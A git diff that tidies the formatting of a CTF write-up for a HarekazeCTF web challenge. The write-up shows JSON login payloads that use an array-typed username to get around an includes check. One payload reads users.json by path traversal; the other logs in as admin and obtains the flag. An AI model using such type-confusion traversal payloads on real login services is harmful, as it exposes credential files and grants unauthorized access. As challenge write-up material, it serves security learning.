@@ -105,9 +105,10 @@ app.post('/login', async (request, reply) => {
 });
 ```
 Login handler doesn't check username and password type whether string or not.
-So, we can bypass above `includes` logic by inserting array.
+So, we can bypass above `includes` logic by inserting `array`.
 
 I got a users.json using below query:
+
 Query: {"username":["../users.json"],"password":null}
 
 Users.json
@@ -119,7 +120,8 @@ Users.json
 ```
 
 Finally i logged in and got a flag.
-Query: Query: {"username":["admin-b01b9d62015f8b68"],"password":"b56c497ff08f76536631f2cc1100521ffabfece3d2da67c71176d69dcba41a25"}
+
+Query: {"username":["admin-b01b9d62015f8b68"],"password":"b56c497ff08f76536631f2cc1100521ffabfece3d2da67c71176d69dcba41a25"}
 
 FLAG: HarekazeCTF{maji_natural_super_nyan}
 
